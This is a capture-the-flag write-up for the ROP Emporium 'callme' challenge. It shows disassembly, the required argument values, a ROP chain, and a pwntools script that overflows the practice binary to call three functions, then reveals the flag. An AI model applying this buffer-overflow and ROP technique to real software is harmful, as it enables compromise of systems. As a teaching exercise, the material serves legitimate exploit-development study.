# callme(ROP Emporium 3)

## info

### checksec
```
Arch:       amd64-64-little
RELRO:      Partial RELRO
Stack:      No canary found
NX:         NX enabled
PIE:        No PIE (0x400000)
RUNPATH:    b'.'
Stripped:   No
```

### usefulFuntion: 0x4008f2
```asm
00000000004008f2 <usefulFunction>:
  4008f2:	55                   	push   rbp
  4008f3:	48 89 e5             	mov    rbp,rsp
  4008f6:	ba 06 00 00 00       	mov    edx,0x6
  4008fb:	be 05 00 00 00       	mov    esi,0x5
  400900:	bf 04 00 00 00       	mov    edi,0x4
  400905:	e8 e6 fd ff ff       	call   4006f0 <callme_three@plt>
  40090a:	ba 06 00 00 00       	mov    edx,0x6
  40090f:	be 05 00 00 00       	mov    esi,0x5
  400914:	bf 04 00 00 00       	mov    edi,0x4
  400919:	e8 22 fe ff ff       	call   400740 <callme_two@plt>
  40091e:	ba 06 00 00 00       	mov    edx,0x6
  400923:	be 05 00 00 00       	mov    esi,0x5
  400928:	bf 04 00 00 00       	mov    edi,0x4
  40092d:	e8 ee fd ff ff       	call   400720 <callme_one@plt>
  400932:	bf 01 00 00 00       	mov    edi,0x1
  400937:	e8 14 fe ff ff       	call   400750 <exit@plt>
```

### callme_one, two, three
need 3 arguments: `rdi`, `rsi`, `rdx`
```asm
 82e:	48 b8 ef be ad de ef 	movabs rax,0xdeadbeefdeadbeef
 835:	be ad de 
 838:	48 39 45 e8          	cmp    QWORD PTR [rbp-0x18],rax
 83c:	0f 85 d0 00 00 00    	jne    912 <callme_one+0xf8>
 842:	48 b8 be ba fe ca be 	movabs rax,0xcafebabecafebabe
 849:	ba fe ca 
 84c:	48 39 45 e0          	cmp    QWORD PTR [rbp-0x20],rax
 850:	0f 85 bc 00 00 00    	jne    912 <callme_one+0xf8>
 856:	48 b8 0d f0 0d d0 0d 	movabs rax,0xd00df00dd00df00d
 85d:	f0 0d d0 
 860:	48 39 45 d8          	cmp    QWORD PTR [rbp-0x28],rax
 864:	0f 85 a8 00 00 00    	jne    912 <callme_one+0xf8>
```
- rdi: 0xdeadbeefdeadbeef
- rsi: 0xcafebabecafebabe
- rdx: 0xd00df00dd00df00d

### callme_one
```c
FILE f = fopen("encrypted_flag.dat", "r");
if (f == NULL) {
    exit(1);
}

char *g_buf = malloc(0x21);
char *ret = fgets(g_buf, 0x21, f);
fclose(f);
puts("callme_one() called correctly");
```

### callme_two
```c
FILE f = fopen("key1.dat", "r");
if (f == NULL) {
    exit(1);
}

for (int i = 0; i < 0x10; i++) {
    int ch = fgetc(f);
}

fclose(f);
puts("callme_one() called correctly");
```

この順番で呼ぶ: callme_one -> callme_two -> callme_three

## Solution
call functions by plt

### strategy
1. call `usefulGadget` with 3 arguments
2. call `callme_one@plt`, `callme_two@plt`, `callme_three@plt`

ROP chain:
- pop rdi, rsi, rdx; ret: 0x40093c
- rdi: 0xdeadbeefdeadbeef
- rsi: 0xcafebabecafebabe
- rdx: 0xd00df00dd00df00d
- callme_one@plt: 0x400720
- pop rdi, rsi, rdx; ret
- rdi: 0xdeadbeefdeadbeef
- rsi: 0xcafebabecafebabe
- rdx: 0xd00df00dd00df00d
- callme_two@plt: 0x400740
- pop rdi, rsi, rdx; ret
- rdi: 0xdeadbeefdeadbeef
- rsi: 0xcafebabecafebabe
- rdx: 0xd00df00dd00df00d
- callme_three@plt: 0x4006f0

## Script
```python
from pwn import *

conn = process('./callme')

payload = b'A' * 0x28
payload += p64(0x40093c) 
payload += p64(0xdeadbeefdeadbeef)
payload += p64(0xcafebabecafebabe)
payload += p64(0xd00df00dd00df00d)
payload += p64(0x400720)
payload += p64(0x40093c) 
payload += p64(0xdeadbeefdeadbeef)
payload += p64(0xcafebabecafebabe)
payload += p64(0xd00df00dd00df00d)
payload += p64(0x400740)
payload += p64(0x40093c) 
payload += p64(0xdeadbeefdeadbeef)
payload += p64(0xcafebabecafebabe)
payload += p64(0xd00df00dd00df00d)
payload += p64(0x4006f0)

conn.sendlineafter('> ', payload)
conn.interactive()
```

## OMAKE
encrypted_flag: 
```
00000000  53 4d 53 41 91 d9 f5 a6  8a d5 c5 b7 db db 9d be  |SMSA............|
00000010  ca da b2 ed 2a 84 63 bc  71 b5 70 a0 7c 79 3e 5d  |....*.c.q.p.|y>]|
```

true flag: 
```
00000000  52 4f 50 45 7b 61 5f 70  6c 61 63 65 68 6f 6c 64  |ROPE{a_placehold|
00000010  65 72 5f 33 32 62 79 74  65 5f 66 6c 61 67 21 7d  |er_32byte_flag!}|
```